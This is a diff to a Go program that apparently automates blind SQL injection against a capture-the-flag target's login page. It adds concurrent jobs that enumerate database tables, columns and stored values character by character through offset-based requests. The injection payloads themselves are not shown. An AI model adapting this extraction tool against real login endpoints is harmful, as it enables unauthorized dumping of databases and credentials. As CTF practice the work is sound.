@@ -6,64 +6,56 @@ import (
 	"log"
 	"net/http"
 	"strings"
+	"sync"
 )
 
 var charTable = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \t\n\r!#$%&\\'()*+,-./:;<=>?@[\\]^_`{|}~"
+
+func tableJob(offset int, url string, method string, resultTable *map[string]bool, wg *sync.WaitGroup) {
+	defer wg.Done()
+	GetTable(offset, url, method, resultTable)
+}
+
+func columnJob(url string, method string, table string, wg *sync.WaitGroup) {
+	defer wg.Done()
+	for offset := 0; offset < 300; offset++ {
+		GetColumn(offset, url, method, table)
+	}
+}
+
+func valueJob(url string, method string, table string, valueTable *map[string]string, wg *sync.WaitGroup) {
+	defer wg.Done()
+	for offset := 0; offset < 300; offset++ {
+		GetValue(offset, url, method, table, valueTable)
+	}
+}
 
 func main() {
 	url := "http://ctf.adl.tw:12004/login.php"
 	method := "POST"
 
-	/*
-		resultTable := make(map[string]bool)
-			for offset := 0; offset < 13; offset++ {
-				go GetTable(offset, url, method, &resultTable)
-				time.Sleep(time.Millisecond * 200)
-			}
-			for len(resultTable) < 12 {
-				time.Sleep(time.Second * 1)
-			}
-	*/
+	var wg sync.WaitGroup
 
-	/*go func() {
-		for k := range resultTable {
-			for offset := 0; offset < 20; offset++ {
-				GetColumn(offset, url, method, k)
-			}
-		}
-	}()*/
+	resultTable := make(map[string]bool)
 
-	valueTable2 := make(map[string]string)
-	target := []string{
-		"flag1",
-		"flag2",
-		"flag3",
-		"flag4",
-		"flag5",
-		"flag6",
-		"flag7",
-		"flag8",
-		"flag9",
-		"flag10",
+	for offset := 0; offset < 13; offset++ {
+		wg.Add(1)
+		go tableJob(offset, url, method, &resultTable, &wg)
 	}
-	for _, v := range target {
-		for offset := 0; offset <= 300; offset++ {
-			GetValue(offset, url, method, v, &valueTable2)
-		}
-	}
-	//for offset := 0; offset <= 20; offset++ {
-	//	GetValue(offset, url, method, os.Args[1], &valueTable2)
-	//}
-	//time.Sleep(time.Millisecond * 1000)
+	wg.Wait()
 
-	/*
-		valueTable := make(map[string]string)
-		for k := range resultTable {
-			for offset := 0; offset <= 20; offset++ {
-				GetValue(offset, url, method, k, &valueTable)
-			}
-		}
-	*/
+	for k := range resultTable {
+		wg.Add(1)
+		go columnJob(url, method, k, &wg)
+	}
+	wg.Wait()
+
+	valueTable := make(map[string]string)
+	for k := range resultTable {
+		wg.Add(1)
+		valueJob(url, method, k, &valueTable, &wg)
+	}
+	wg.Wait()
 }
 
 func GetTable(offset int, url string, method string, resultTable *map[string]bool) (bool, string) {
